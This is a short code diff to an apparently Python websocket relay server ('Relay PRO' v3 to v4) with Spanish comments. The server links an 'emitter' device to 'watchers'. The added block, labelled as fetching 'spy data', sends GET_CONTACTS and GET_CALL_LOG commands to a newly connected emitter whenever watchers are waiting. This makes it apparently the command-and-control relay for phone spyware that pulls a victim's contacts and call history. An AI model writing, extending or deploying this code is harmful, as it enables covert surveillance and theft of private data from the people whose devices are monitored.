@@ -136,9 +136,14 @@ async def handle(request):
 
             # ── FIX 3: notificar EMITTER_BACK a watchers ya conectados ──
             # (Specter puede haber conectado antes que GhostEye 2)
-            for w in list(watchers.get(code, set())):
-                if not w.closed:
-                    await safe_send_str(w, "EMITTER_BACK")
+            existing_watchers = [w for w in list(watchers.get(code, set())) if not w.closed]
+            for w in existing_watchers:
+                await safe_send_str(w, "EMITTER_BACK")
+            # ── FIX 4: pedir datos spy al nuevo emisor si hay watchers ──
+            if existing_watchers:
+                log(code, "EMIT con watchers previos — solicitando contactos y llamadas")
+                await safe_send_str(ws, "GET_CONTACTS")
+                await safe_send_str(ws, "GET_CALL_LOG")
 
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.BINARY:
@@ -293,7 +298,7 @@ async def main():
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
-    print(f"Relay PRO v3 corriendo en puerto {port}")
+    print(f"Relay PRO v4 corriendo en puerto {port}")
     asyncio.ensure_future(self_ping(app))
     await asyncio.Future()
 
